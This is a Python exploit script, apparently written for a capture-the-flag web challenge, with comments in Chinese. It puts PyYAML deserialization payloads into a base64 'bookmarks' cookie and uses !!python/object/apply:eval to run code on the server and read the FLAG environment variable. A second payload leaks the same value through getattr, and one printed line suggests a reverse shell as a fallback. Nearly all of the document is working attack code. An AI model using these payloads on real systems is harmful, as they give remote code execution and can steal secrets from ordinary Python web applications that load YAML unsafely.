#!/usr/bin/env python3
"""
X-075-24 Exploit - YAML Deserialization
"""

import requests
import base64
import re

TARGET_URL = "http://ip32837"

print("[*] X-075-24 YAML反序列化漏洞利用")
print(f"[*] 目标: {TARGET_URL}\n")

# 最有效的payload: 使用UrlObj对象,将FLAG放入name和url字段
print("[+] 使用UrlObj对象携带FLAG到HTML页面")
payload = """
- !!python/object:app.models.UrlObj
  name: !!python/object/apply:eval ['__import__("os").environ.get("FLAG", "NOT_FOUND")']
  url: !!python/object/apply:eval ['__import__("os").environ.get("FLAG", "NOT_FOUND")']
"""

encoded = base64.b64encode(payload.encode('ISO-8859-1')).decode('ISO-8859-1')
cookies = {'bookmarks': encoded, 'user': 'exploit'}

try:
    r = requests.get(f"{TARGET_URL}/list", cookies=cookies, timeout=5)
    print(f"状态码: {r.status_code}\n")
    
    # 查找所有可能的flag格式
    flags = re.findall(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    
    if flags:
        print(f"[SUCCESS] 找到FLAG!")
        print(f"\n{'='*60}")
        for flag in set(flags):  # 使用set去重
            print(f"FLAG: {flag}")
        print(f"{'='*60}\n")
    else:
        # 如果没找到标准格式的flag,打印完整响应
        print("未找到标准格式flag,打印完整响应:")
        print(r.text)
        
except Exception as e:
    print(f"错误: {e}")

print("\n[*] 如果上面的payload没有成功,尝试反弹shell或其他方法...")

# 备选方案: 尝试通过错误信息泄露
print("\n[+] 备选: 通过AttributeError泄露FLAG")
payload2 = """
- !!python/object/apply:getattr
  args:
  - !!python/object/apply:eval
    args: ['__import__("os").environ']
  - FLAG
"""

encoded2 = base64.b64encode(payload2.encode('ISO-8859-1')).decode('ISO-8859-1')
cookies2 = {'bookmarks': encoded2, 'user': 'exploit'}

try:
    r = requests.get(f"{TARGET_URL}/list", cookies=cookies2, timeout=5)
    print(f"状态码: {r.status_code}")
    
    flags = re.findall(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flags:
        print(f"[SUCCESS] 找到FLAG: {flags[0]}")
        print(f"\n{'='*60}")
        print(f"FLAG: {flags[0]}")
        print(f"{'='*60}\n")
        
except Exception as e:
    print(f"错误: {e}")